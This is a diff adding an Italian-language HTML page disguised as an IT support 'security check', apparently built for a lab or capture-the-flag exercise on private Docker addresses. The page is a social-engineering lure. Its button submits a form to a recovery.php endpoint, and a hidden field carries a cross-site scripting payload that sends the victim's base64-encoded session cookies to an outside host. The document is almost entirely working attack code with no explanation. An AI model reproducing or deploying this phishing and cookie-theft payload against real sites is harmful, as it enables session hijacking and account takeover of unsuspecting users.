@@ -1,0 +1,63 @@
+
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>IT Support - Security Check</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
+            max-width: 400px;
+        }
+        .warning-icon {
+            font-size: 50px;
+            color: #d9534f;
+            margin-bottom: 10px;
+        }
+        h2 { color: #333; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .btn {
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+        .btn:hover { background-color: #004494; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="warning-icon">⚠️</div>
+        <h2>Sincronizzazione Account</h2>
+        <p>Il sistema ha rilevato un'anomalia con i cookie di sessione del tuo account. Per evitare la disattivazione e ripristinare i permessi, clicca sul pulsante sottostante per forzare un recupero sicuro.</p>
+
+        <form action="http://172.17.0.2/recovery.php" method="POST">
+
+            <textarea name="mail" style="display:none;"><svg onload="fetch('http://172.17.0.1/?cookie=' + btoa(document.cookie))"></svg></textarea>
+
+            <button class="btn" type="submit">Ripristina Sessione Sicura</button>
+
+        </form>
+    </div>
+
+</body>
+</html>
